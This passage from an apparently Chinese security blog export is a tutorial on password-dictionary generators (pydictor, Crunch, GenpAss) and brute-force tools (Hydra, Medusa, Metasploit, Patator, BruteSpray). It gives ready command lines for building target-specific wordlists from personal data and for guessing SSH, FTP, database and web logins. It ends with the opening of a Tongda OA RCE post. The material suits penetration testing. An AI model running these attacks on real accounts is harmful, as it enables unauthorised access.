<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定长度</span></span><br><span class="line">--len minlen maxlen   Default: min=0  max=4</span><br><span class="line"><span class="comment"># 根据指定的字符串进行排列组合</span></span><br><span class="line">-chunk arg [arg ...]  Use the multi-chunk build the dictionary</span><br><span class="line"><span class="comment"># 指定字符类型。d表示数字,L表示小写字母,,,,</span></span><br><span class="line">-base Type            Choose from  (d, L, c, dL, dc, Lc, dLc)</span><br><span class="line">                           d     digital             [0 - 9]</span><br><span class="line">                           L     lowercase letters   [a - z]</span><br><span class="line">                           c     capital letters     [A - Z]</span><br><span class="line">                           dL    Mix d and L         [0-9 a-z]</span><br><span class="line">                           dc    Mix d and c         [0-9 A-Z]</span><br><span class="line">                           Lc    Mix L and c         [a-z A-Z]</span><br><span class="line">                           dLc   Mix d, L and dL     [0-9 a-z A-Z]</span><br><span class="line"> <span class="comment"># 指定输出字典路径                            </span></span><br><span class="line">-o path, --output path</span><br><span class="line"><span class="comment"># 指定字符集</span></span><br><span class="line">-char character       Use Custom Character build the dictionary</span><br><span class="line"><span class="comment"># 社会工程学字典</span></span><br><span class="line">--sedb                Enter the Social Engineering Dictionary Builder</span><br><span class="line"><span class="comment"># 前缀 [xxxx]pass</span></span><br><span class="line"> --head prefix         Add string head <span class="keyword">for</span> the items</span><br><span class="line"> <span class="comment"># 后缀 pass[xxxx]</span></span><br><span class="line"> --tail suffix         Add string tail <span class="keyword">for</span> the items</span><br><span class="line"> <span class="comment"># 生成的字符进行编码</span></span><br><span class="line"> --encode encode       b16       base16 encode</span><br><span class="line">                       b32       base32 encode</span><br><span class="line">                       b64       base64 encode</span><br></pre></td></tr></table></figure>

<h4 id="核心功能字典"><a href="#核心功能字典" class="headerlink" title="核心功能字典"></a>核心功能字典</h4><ul>
<li>基础字典</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -base L --len 2 3 --encode b64 <span class="comment"># 长度2-3且经过base64编码的大写字符</span></span><br><span class="line">python pydictor.py -base dLc --len 1 3 -o /awesome/<span class="built_in">pwd</span></span><br><span class="line">python pydictor.py -base d --len 4 4 --head Pa5sw0rd --output D:\exists\or\not\dict.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>自定义字符集字典</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -char <span class="string">&quot;asdf123._@ &quot;</span> --len 1 3 --tail @site.com</span><br></pre></td></tr></table></figure>

<ul>
<li>排列组合字典</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -chunk abc 123 <span class="string">&quot;!@#&quot;</span> @ . _ <span class="string">&quot; &quot;</span> --head a --tail @pass --encode md5</span><br></pre></td></tr></table></figure>

<ul>
<li>语法引擎解析字典</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py --conf                                  用默认的<span class="string">&quot;/funcfg/build.conf&quot;</span>文件建立字典</span><br><span class="line">python pydictor.py --conf /my/other/awesome.conf</span><br><span class="line">python pydictor.py --conf <span class="string">&quot;[0-9]&#123;6,6&#125;&lt;none&gt;[a-f,abc,123,!@#]&#123;1,1&#125;&lt;none&gt;&quot;</span> --encode md5 --output parsing.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>规则扩展字典</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -extend bob --level 4 --len 4 12</span><br><span class="line">python pydictor.py -extend liwei zwell.com --leet 0 1 2 11 21 --level 2 --len 6 16 --occur <span class="string">&quot;&lt;=10&quot;</span> <span class="string">&quot;&gt;0&quot;</span> <span class="string">&quot;&lt;=2&quot;</span> -o /possbile/wordlist.lst</span><br></pre></td></tr></table></figure>



<h4 id="指定插件"><a href="#指定插件" class="headerlink" title="指定插件"></a>指定插件</h4><ul>
<li>网页原始关键词字典</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -plug scratch     <span class="comment"># 用/funcfg/scratch.sites 文件中的多行 url 作为输入</span></span><br><span class="line">python pydictor.py -plug scratch http://www.example.com</span><br></pre></td></tr></table></figure>

<ul>
<li>一段时间内生日字典</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -plug birthday 19800101 20001231 --len 6 8</span><br></pre></td></tr></table></figure>

<ul>
<li>身份证后4/6/8位字典</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -plug pid4</span><br><span class="line">python pydictor.py -plug pid6 --encode b64</span><br><span class="line">python pydictor.py -plug pid8 --encode sha1 -o pid8.txt</span><br></pre></td></tr></table></figure>

<h4 id="内置工具-可自己根据API文档开发"><a href="#内置工具-可自己根据API文档开发" class="headerlink" title="内置工具(可自己根据API文档开发)"></a>内置工具(可自己根据API文档开发)</h4><ul>
<li>字典合并工具</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -tool combiner /my/mess/dir</span><br></pre></td></tr></table></figure>

<ul>
<li>字典比较工具</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -tool comparer big.txt small.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>词频统计工具</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -tool counter s huge.txt 1000</span><br><span class="line">python pydictor.py -tool counter v /tmp/mess.txt 100</span><br><span class="line">python pydictor.py -tool counter vs huge.txt 100 --encode url -o fre.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>字典处理工具</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -tool handler raw.txt --tail @awesome.com --encode md5</span><br><span class="line">python pydictor.py -tool handler raw.txt --len 6 16 --occur <span class="string">&quot;&quot;</span> <span class="string">&quot;=6&quot;</span> <span class="string">&quot;&lt;0&quot;</span> --encode b64 -o ok.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>安全擦除字典工具</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -tool shredder                    擦除当前输出目录下所有字典文件</span><br><span class="line">python pydictor.py -tool shredder base 		         擦除当前输出目录下所有以<span class="string">&quot;base&quot;</span>开头的字典文件</span><br><span class="line">python pydictor.py -tool shredder /data/mess</span><br><span class="line">python pydictor.py -tool shredder D:\mess\1.zip</span><br></pre></td></tr></table></figure>

<ul>
<li>合并去重工具</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -tool uniqbiner /my/all/dict/</span><br></pre></td></tr></table></figure>

<ul>
<li>字典去重工具</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -tool uniqifer /tmp/dicts.txt --output /tmp/uniq.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>多字典文件组合工具</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pydictor.py -tool hybrider heads.txt some_others.txt tails.txt</span><br></pre></td></tr></table></figure>

<h4 id="社会工程学字典"><a href="#社会工程学字典" class="headerlink" title="社会工程学字典"></a>社会工程学字典</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 。。。</span></span><br><span class="line">python pydictor.py --sedb</span><br><span class="line"><span class="built_in">set</span> cname liwei</span><br><span class="line"><span class="built_in">set</span> sname lw Lwei</span><br><span class="line"><span class="built_in">set</span> ename zwell</span><br><span class="line"><span class="built_in">set</span> birth 19880916</span><br><span class="line"><span class="built_in">set</span> usedpwd liwei123456. liwei@19880916 lw19880916_123</span><br><span class="line"><span class="built_in">set</span> phone 18852006666</span><br><span class="line"><span class="built_in">set</span> uphone 15500998080</span><br><span class="line"><span class="built_in">set</span> hphone 76500100 61599000 01061599000</span><br><span class="line"><span class="built_in">set</span> email 33125500@qq.com</span><br><span class="line"><span class="built_in">set</span> email 13561207878@163.com</span><br><span class="line"><span class="built_in">set</span> email weiweili@gmail.com</span><br><span class="line"><span class="built_in">set</span> email wei010wei@hotmail.com</span><br><span class="line"><span class="built_in">set</span> postcode 663321 962210</span><br><span class="line"><span class="built_in">set</span> nickname zlili</span><br><span class="line"><span class="built_in">set</span> idcard 152726198809160571</span><br><span class="line"><span class="built_in">set</span> jobnum 20051230 100563</span><br><span class="line"><span class="built_in">set</span> otherdate 19591004 19621012</span><br><span class="line"><span class="built_in">set</span> otherdate 19870906 19880208</span><br><span class="line"><span class="built_in">set</span> usedchar tiger gof gamesthrones 176003 m0n5ter ppdog</span><br><span class="line">show</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="Crunch"><a href="#Crunch" class="headerlink" title="Crunch"></a>Crunch</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/crunchsec/crunch</span><br><span class="line"><span class="comment"># 编译安装，下载 make</span></span><br><span class="line"><span class="comment"># 可以直接安装 apt-get install crunch</span></span><br><span class="line"><span class="comment"># brew install crunch</span></span><br></pre></td></tr></table></figure>

<p>常用参数:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-c 数字 指定写入输出文件的行数，也即包含密码的个数</span><br><span class="line">-e 字符串，定义停止生成密码 ，比如-e 222222：到222222停止生成密码</span><br><span class="line">-p 字符串 或者-p 单词1 单词2 ...以排列组合的方式来生成字典。</span><br><span class="line">-f /path/to/charset.lst charset-name，从charset.lst指定字符集，也即调用密码库文件</span><br><span class="line">-t 命令如下：</span><br><span class="line">  -t @,%^，指定模式，@,%^分别代表意义如下：</span><br><span class="line">  @ 插入小写字母</span><br><span class="line">  , 插入大写字母</span><br><span class="line">  % 插入数字</span><br><span class="line">  ^ 插入特殊符号  </span><br><span class="line">-d 数字符号，限制出现相同元素的个数(至少出现元素个数)，“-d 2@”限制小写字母输出像aab和aac，aaa不会产生，因为这是连续3个字母，格式是数字+符号，数字是连续字母出现的次数，符号是限制字符串的字符，例如@,%^(“@”代表小写字母，“,”代表大写字符，“%”代表数字，“^”代表特殊字符)(限制每个密码至少出现几种字符)</span><br></pre></td></tr></table></figure>

<ul>
<li>普通生成</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 1 6</span><br><span class="line">crunch 1 6 asdqwe\@!</span><br></pre></td></tr></table></figure>

<ul>
<li>生成passXX-passXX所有组合</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 6 6 -t pass%%  &gt;&gt;newpwd.txt  <span class="comment"># pass%%数字组合;pass@@小写字母; pass,,大写字母;pass^^后两位特殊字符</span></span><br></pre></td></tr></table></figure>

<ul>
<li>制作8为数字字典</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 8 8 charset.lst numeric -o num8.dic </span><br></pre></td></tr></table></figure>

<ul>
<li>制作6为数字字典</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 6 6  0123456789 –o num6.dic </span><br></pre></td></tr></table></figure>

<ul>
<li>制作139开头的手机密码字典</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 11 11  +0123456789 -t 139%%%%%%%% -o num13.dic </span><br><span class="line">crunch 11 11  +0123456789 -t 139%%%%%%%% -b 20mib -o START  <span class="comment"># 指定文件大小20M</span></span><br></pre></td></tr></table></figure>

<ul>
<li>使用密码库</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-f /path/to/charset.lst charset-name，从charset.lst指定字符集，也即调用密码库文件</span><br><span class="line"></span><br><span class="line">crunch 1 8 -f charset.lst mixalpha-numeric-all-space -o wordlist.txt </span><br><span class="line"><span class="comment"># 调用密码库charset.lst，生成最小为1，最大为8,元素为密码库charset.lst中 mixalpha-numeric-all-space的项目，并保存为 wordlist.txt;其中 charset.lst在kali_linux的目录为 /usr/share/crunch/charset.lst， charset.lst中mixalpha-numeric-all-space项目包含最常见的元素组合(即大小写字母+数字+常见符号);使用cat /usr/share/crunch/charset.lst 查看所有密码库</span></span><br></pre></td></tr></table></figure>

<h3 id="GenpAss"><a href="#GenpAss" class="headerlink" title="GenpAss"></a>GenpAss</h3><p>一款针对Chinese的字典生成器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/RicterZ/genpAss</span><br><span class="line"><span class="built_in">cd</span> genpAss</span><br><span class="line">git checkout master</span><br><span class="line">python setup.py install (建议python2,本地用pyhton3有问题)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-n       <span class="comment">#名字</span></span><br><span class="line">-u       <span class="comment">#用户名</span></span><br><span class="line">-q       <span class="comment">#QQ号</span></span><br><span class="line">-e       <span class="comment">#邮箱</span></span><br><span class="line">-m       <span class="comment">#手机号</span></span><br><span class="line">-b       <span class="comment">#生日：格式：2000-01-01</span></span><br><span class="line">-c       <span class="comment">#公司名</span></span><br><span class="line">-o       <span class="comment">#导出文件</span></span><br></pre></td></tr></table></figure>

<h4 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h4><ul>
<li>假定一个人的信息如下：</li>
</ul>
<table>
<thead>
<tr>
<th>字段</th>
<th>信息</th>
</tr>
</thead>
<tbody><tr>
<td>姓名</td>
<td>王大锤</td>
</tr>
<tr>
<td>用户名</td>
<td>dachui,dac</td>
</tr>
<tr>
<td>QQ</td>
<td>818271273</td>
</tr>
<tr>
<td>手机</td>
<td>13928182828</td>
</tr>
<tr>
<td>邮箱</td>
<td><span class="exturl" data-url="bWFpbHRvOndhbmdkYWNAZ21haWwuY29t">wangdac@gmail.com<i class="fa fa-external-link-alt"></i></span></td>
</tr>
<tr>
<td>生日</td>
<td>1993-12-21</td>
</tr>
<tr>
<td>公司</td>
<td>baidu</td>
</tr>
</tbody></table>
<p>语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">genpass -n 王大锤 -u dachui dac -b 1993-12-21 -c baidu -m 13928182828 -q 818271273 -e wangdac@gmail.com</span><br></pre></td></tr></table></figure>

<p>同时可以添加<code>--with-dict</code>来根据常见弱口令组合密码。</p>
<p>另外可以通过<code>--csv</code>指定 csv 文件批量生成密码，csv 文件格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">name,email,birthday,username,mobile_phone,qq_number,company,</span><br><span class="line">测试,ceshi@x.com,1995-01-03,<span class="built_in">test</span> cece,18883866666,23591712,google,</span><br><span class="line">大头,datou@x.com,1996-03-03,bighead,18883877777 18883899999,392912031,baidu,</span><br></pre></td></tr></table></figure>

<h2 id="常用暴力破解工具"><a href="#常用暴力破解工具" class="headerlink" title="常用暴力破解工具"></a>常用暴力破解工具</h2><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p>hydra是黑客组织thc的一款开源密码攻击工具，功能十分强大，支持多种协议的破解。（支持的协议包括: adam6500 asterisk cisco cisco-enable cvs ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql(v4) nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmpp）</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">参数详解</th>
</tr>
</thead>
<tbody><tr>
<td align="left">-l</td>
<td align="left">指定单个用户名，适合在知道用户名爆破用户名密码时使用</td>
</tr>
<tr>
<td align="left">-L</td>
<td align="left">指定多个用户名，参数值为存储用户名的文件的路径(建议为绝对路径)</td>
</tr>
<tr>
<td align="left">-p</td>
<td align="left">指定单个密码，适合在知道密码爆破用户名时使用</td>
</tr>
<tr>
<td align="left">-P</td>
<td align="left">指定多个密码，参数值为存贮密码的文件(通常称为字典)的路径(建议为绝对路径)</td>
</tr>
<tr>
<td align="left">-C</td>
<td align="left">当用户名和密码存储到一个文件时使用此参数。字典存储的格式必须为 “用户名:密码” 的格式。</td>
</tr>
<tr>
<td align="left">-M</td>
<td align="left">指定多个攻击目标，建议为绝对路径。注意：列表文件存储格式必须为 “地址:端口”</td>
</tr>
<tr>
<td align="left">-t</td>
<td align="left">指定爆破时的任务数量(可以理解为线程数)，默认为16</td>
</tr>
<tr>
<td align="left">-s</td>
<td align="left">指定端口，适用于攻击目标端口非默认的情况。例如：http服务使用非80端口</td>
</tr>
<tr>
<td align="left">-S</td>
<td align="left">指定爆破时使用 SSL 链接</td>
</tr>
<tr>
<td align="left">-R</td>
<td align="left">继续从上一次爆破进度上继续爆破</td>
</tr>
<tr>
<td align="left">-v/-V</td>
<td align="left">显示爆破的详细信息</td>
</tr>
<tr>
<td align="left">-f</td>
<td align="left">一但爆破成功一个就停止爆破</td>
</tr>
<tr>
<td align="left">server</td>
<td align="left">代表要攻击的目标(单个)，多个目标时请使用 -M 参数</td>
</tr>
<tr>
<td align="left">service</td>
<td align="left">攻击目标的服务类型(可以理解为爆破时使用的协议)，例如 http ，在hydra中，不同协议会使用不同的模块来爆破，hydra 的 http-get 和 http-post 模块就用来爆破基于 get 和 post 请求的页面</td>
</tr>
<tr>
<td align="left">OPT</td>
<td align="left">爆破模块的额外参数，可以使用 -U 参数来查看模块支持那些参数，例如命令：hydra -U http-get</td>
</tr>
</tbody></table>
<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>常用方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l user -P passlist.txt ftp://192.168.0.1</span><br><span class="line">hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN</span><br><span class="line">hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5</span><br><span class="line">hydra -l admin -p password ftp://[192.168.0.0/24]/</span><br><span class="line">hydra -L logins.txt -P pws.txt -M targets.txt ssh</span><br></pre></td></tr></table></figure>

<h3 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h3><p>Medusa是支持AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP (NetWare),NNTP, PcAnywhere, POP3, PostgreSQL, rexec, rlogin, rsh, SMB, SMTP(AUTH/VRFY), SNMP, SSHv2, SVN, Telnet, VmAuthd, VNC的密码爆破工具。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>详解</th>
</tr>
</thead>
<tbody><tr>
<td>-h</td>
<td>指定目标IP</td>
</tr>
<tr>
<td>-H</td>
<td>指定目标主机文件</td>
</tr>
<tr>
<td>-u</td>
<td>指定单个用户名</td>
</tr>
<tr>
<td>-U</td>
<td>指定用户名文件</td>
</tr>
<tr>
<td>-p</td>
<td>指定单个密码</td>
</tr>
<tr>
<td>-P</td>
<td>指定密码文件</td>
</tr>
<tr>
<td>-C</td>
<td>组合条目文件 账号:密码</td>
</tr>
<tr>
<td>-e [n/s/ns]</td>
<td>N意为空密码，S意为密码 ，NS判断密码是否是空密码,还是账号密码相同。</td>
</tr>
<tr>
<td>-M</td>
<td>模块执行名称</td>
</tr>
<tr>
<td>-O</td>
<td>保存成功的文件</td>
</tr>
<tr>
<td>-n</td>
<td>使用非默认端口</td>
</tr>
<tr>
<td>-s</td>
<td>启用SSL</td>
</tr>
<tr>
<td>-t</td>
<td>设定线程数量</td>
</tr>
<tr>
<td>-r</td>
<td>设置重试时间间隔 秒。</td>
</tr>
<tr>
<td>-L</td>
<td>并行化，每个用户使用一个线程</td>
</tr>
<tr>
<td>-f</td>
<td>在任何主机上找到第一个账号/密码后，停止破解</td>
</tr>
<tr>
<td>-z</td>
<td>继续扫描上一次</td>
</tr>
<tr>
<td>-v</td>
<td>详细级别（0-6）</td>
</tr>
</tbody></table>
<h4 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h4><ul>
<li>指定目标地址文件，用户名postgres， 端口5432， 密码字典，判断密码是否是空密码或者账号密码相同，爆破postgres，线程255，一次成功则停止，保存为good.txt，重试时间间隔为0秒。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -H /tmp/ip.txt -u postgres -n 5432 -P /tmp/pass.txt -e ns -M postgres -T 255 -f -O /tmp/good.txt -r 0</span><br></pre></td></tr></table></figure>

<h3 id="Metaspolit"><a href="#Metaspolit" class="headerlink" title="Metaspolit"></a>Metaspolit</h3><p>。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search <span class="built_in">type</span>:auxiliary login</span><br><span class="line">(ssh_login,mysql_login,telnet_login,smb_login,ftp_login,tomcat_mgr_login。。。)</span><br><span class="line">use auxiliary/scanner/ssh/ssh_login  </span><br><span class="line">(show options)</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.92.132</span><br><span class="line"><span class="built_in">set</span> username <span class="built_in">test</span></span><br><span class="line"><span class="built_in">set</span> pass_file</span><br><span class="line"><span class="built_in">set</span> threads 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="Patator"><a href="#Patator" class="headerlink" title="Patator"></a>Patator</h3><p>Patator是出于使用Hydra，Medusa，Ncrack，Metasploit模块和Nmap NSE脚本进行密码猜测攻击而感到沮丧的。我选择了一种不同的方法，以便不创建另一个暴力破解工具，并避免重复相同的缺点。Patator是一个用Python编写的多线程工具，它比同辈人更加可靠和灵活。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> git <span class="built_in">clone</span> https://github.com/lanjelot/patator.git</span><br><span class="line"> <span class="built_in">cd</span> patator</span><br><span class="line"> <span class="comment"># python3 setup.py install</span></span><br><span class="line">python3 patator.py</span><br><span class="line"> <span class="comment"># python3 patator.py ftp_login –help查看帮助信息</span></span><br><span class="line">包含的模块：</span><br><span class="line">+ ftp_login     : Brute-force FTP</span><br><span class="line"> + ssh_login     : Brute-force SSH</span><br><span class="line"> + telnet_login  : Brute-force Telnet</span><br><span class="line"> + smtp_login    : Brute-force SMTP</span><br><span class="line"> + smtp_vrfy     : Enumerate valid users using SMTP VRFY</span><br><span class="line"> + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO</span><br><span class="line"> + finger_lookup : Enumerate valid users using Finger</span><br><span class="line"> + http_fuzz     : Brute-force HTTP</span><br><span class="line"> + rdp_gateway   : Brute-force RDP Gateway</span><br><span class="line"> + ajp_fuzz      : Brute-force AJP</span><br><span class="line"> + pop_login     : Brute-force POP3</span><br><span class="line"> + pop_passd     : Brute-force poppassd (http://netwinsite.com/poppassd/)</span><br><span class="line"> + imap_login    : Brute-force IMAP4</span><br><span class="line"> + ldap_login    : Brute-force LDAP</span><br><span class="line"> + smb_login     : Brute-force SMB</span><br><span class="line"> + smb_lookupsid : Brute-force SMB SID-lookup</span><br><span class="line"> + rlogin_login  : Brute-force rlogin</span><br><span class="line"> + vmauthd_login : Brute-force VMware Authentication Daemon</span><br><span class="line"> + mssql_login   : Brute-force MSSQL</span><br><span class="line"> + oracle_login  : Brute-force Oracle</span><br><span class="line"> + mysql_login   : Brute-force MySQL</span><br><span class="line"> + mysql_query   : Brute-force MySQL queries</span><br><span class="line"> + rdp_login     : Brute-force RDP (NLA)</span><br><span class="line"> + pgsql_login   : Brute-force PostgreSQL</span><br><span class="line"> + vnc_login     : Brute-force VNC</span><br><span class="line"> + dns_forward   : Forward DNS lookup</span><br><span class="line"> + dns_reverse   : Reverse DNS lookup</span><br><span class="line"> + snmp_login    : Brute-force SNMP v1/2/3</span><br><span class="line"> + ike_enum      : Enumerate IKE transforms</span><br><span class="line"> + unzip_pass    : Brute-force the password of encrypted ZIP files</span><br><span class="line"> + keystore_pass : Brute-force the password of Java keystore files</span><br><span class="line"> + sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases</span><br><span class="line"> + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes</span><br><span class="line"> + tcp_fuzz      : Fuzz TCP services</span><br><span class="line"> + dummy_test    : Testing module</span><br></pre></td></tr></table></figure>

<h4 id="使用方式-1"><a href="#使用方式-1" class="headerlink" title="使用方式"></a>使用方式</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp_login host=10.0.0.1 user=FILE0 0=logins.txt password=asdf -x ignore:mesg=<span class="string">&#x27;Login incorrect.&#x27;</span> -x ignore,reset,retry:code=500</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http_fuzz url=http://10.0.0.1/pma/index.php method=POST body=<span class="string">&#x27;pma_username=COMBO00&amp;pma_password=COMBO01&amp;server=1&amp;target=index.php&amp;lang=en&amp;token=&#x27;</span> 0=combos.txt before_urls=http://10.0.0.1/pma/index.php accept_cookie=1 follow=1 -x ignore:fgrep=<span class="string">&#x27;Cannot log in to the MySQL server&#x27;</span> -l /tmp/qsdf</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh_login host=192.168.92.132 user=<span class="built_in">test</span> password=FILE0 0=/home/<span class="built_in">test</span>/桌面/TOP1000.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dns_forward name=FILE0.hsc.fr 0=names.txt -x ignore:code=3</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip_pass zipfile=challenge1.zip password=FILE0 0=rockyou.dic -x ignore:code!=0</span><br></pre></td></tr></table></figure>

<h3 id="BruteSpray"><a href="#BruteSpray" class="headerlink" title="BruteSpray"></a>BruteSpray</h3><p> BruteSpray是一款基于nmap扫描输出的gnmap/XML文件，自动调用Medusa对服务进行爆破，声称速度比hydra快。BruteSpray调用medusa，其说明中声称支持ssh、ftp、telnet、vnc、mssql、mysql、postgresql、rsh、imap、nntp、pcanywhere、pop3、rexec、rlogin、smbnt、smtp、svn和vmauthd协议账号暴力破解。</p>
<p>  官方项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3g5MHNreXNuM2svYnJ1dGVzcHJheQ==">https://github.com/x90skysn3k/brutespray<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/x90skysn3k/brutespray.git</span><br></pre></td></tr></table></figure>

<ul>
<li>支持的服务</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh</span><br><span class="line">ftp</span><br><span class="line">telnet</span><br><span class="line">vnc</span><br><span class="line">mssql</span><br><span class="line">mysql</span><br><span class="line">postgresql</span><br><span class="line">rsh</span><br><span class="line">imap</span><br><span class="line">nntp</span><br><span class="line">pcanywhere</span><br><span class="line">pop3</span><br><span class="line">rexec</span><br><span class="line">rlogin</span><br><span class="line">smbnt</span><br><span class="line">smtp</span><br><span class="line">svn</span><br><span class="line">vmauthd</span><br><span class="line">snmp</span><br></pre></td></tr></table></figure>

<h4 id="使用方式-2"><a href="#使用方式-2" class="headerlink" title="使用方式"></a>使用方式</h4><ul>
<li>首先需要Nmap的扫描结果<code>-oG nmap.gnmap</code> or <code>-oX nmap.xml</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -v 192.168.92.0/24 -oX nmap.xml</span><br></pre></td></tr></table></figure>

<ul>
<li>几种扫描模式</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># xml,json,gnmap</span></span><br><span class="line"><span class="comment"># 交互式</span></span><br><span class="line">brutespray --file nmap.xml –i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定服务</span></span><br><span class="line">brutespray -f /home/jhc/nmap.xml -u <span class="built_in">test</span> --service ssh</span><br><span class="line">python brutespray.py --file nmap.gnmap --service ftp,ssh,telnet --threads 5 --hosts 5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定用户名密码</span></span><br><span class="line">python brutespray.py --file nmap.gnmap -u admin -p password --threads 5 --hosts 5</span><br><span class="line">python brutespray.py --file nmap.gnmap -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt --threads 5 --hosts 5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破成功后继续</span></span><br><span class="line">python brutespray.py --file nmap.gnmap --threads 5 --hosts 5 -c</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>爆破</tag>
        <tag>密码生成</tag>
      </tags>
  </entry>
  <entry>
    <title>通达OA 任意文件上传+文件包含 RCE</title>
    <url>/posts/6b303458/</url>
    <content><![CDATA[<p>通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。3月13日发现未授权上传和本地文件包含两个漏洞组合而形成的rce漏洞。</p>
<a id="more"></a>

<h1 id="通达OA-任意文件上传-文件包含-RCE"><a href="#通达OA-任意文件上传-文件包含-RCE" class="headerlink" title="通达OA 任意文件上传+文件包含 RCE"></a>通达OA 任意文件上传+文件包含 RCE</h1><p>通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。</p>
<p>本文测试环境：Windows 10 + OA 2017</p>
<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>此漏洞是由未授权上传和本地文件包含两个漏洞组合而形成的rce漏洞</p>
<ul>
